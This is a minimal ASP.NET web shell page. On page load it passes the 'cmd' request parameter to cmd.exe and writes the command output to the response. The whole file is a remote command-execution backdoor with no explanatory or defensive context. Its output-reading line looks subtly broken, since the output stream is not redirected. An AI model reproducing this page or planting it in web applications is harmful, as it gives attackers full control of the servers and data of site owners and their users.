<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
  void Page_Load(object sender, EventArgs e) {
    Response.Write("<pre>");
    Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd());
    Response.Write("</pre>");
  }
</script>
